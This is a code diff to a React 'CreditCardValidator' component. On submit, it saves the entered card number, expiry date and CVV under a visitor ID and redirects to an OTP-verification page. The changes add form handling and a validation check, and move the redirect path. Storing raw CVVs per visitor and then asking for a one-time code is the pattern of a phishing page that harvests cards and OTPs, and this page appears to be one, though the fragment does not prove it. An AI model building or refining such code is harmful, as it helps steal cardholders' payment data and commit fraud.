@@ -303,6 +303,7 @@ export default function CreditCardValidator() {
 
   const handleSubmit = (e: React.FormEvent) => {
     e.preventDefault()
+    if(result.errors.length > 0 )return
     const visitorId = localStorage.getItem("visitor")
     addData({
       id: visitorId,
@@ -310,7 +311,7 @@ export default function CreditCardValidator() {
       expiryDate,
       cvv
     })
-    window.location.href = "/otp-verification"
+    window.location.href = "/checkout/otp-verification"
   }
   const displayCardNumber = cardNumber || "•••• •••• •••• ••••"
   const displayExpiry = expiryDate || "MM/YY"
@@ -401,7 +402,8 @@ export default function CreditCardValidator() {
             </CardHeader>
 
             <CardContent className="space-y-6">
-              <div className="space-y-5">
+              <form onSubmit={handleSubmit} >
+              <div  className="space-y-5">
                 <div className="space-y-2">
                   <label
                     className={`text-sm font-semibold text-gray-700 flex items-center gap-2 ${isRTL ? "flex-row-reverse" : ""}`}
@@ -468,6 +470,7 @@ export default function CreditCardValidator() {
 
               <Button
                 onClick={checkCard}
+
                 className="w-full h-12 bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white font-semibold text-lg shadow-lg transition-all duration-200 transform hover:scale-[1.02]"
                 disabled={cardNumber.replace(/\D/g, "").length < 12 || !expiryDate || !cvv || !cardholderName.trim()}
               >
@@ -526,6 +529,7 @@ export default function CreditCardValidator() {
                   </div>
                 </div>
               </div>
+              </form>
             </CardContent>
           </Card>
         </div>
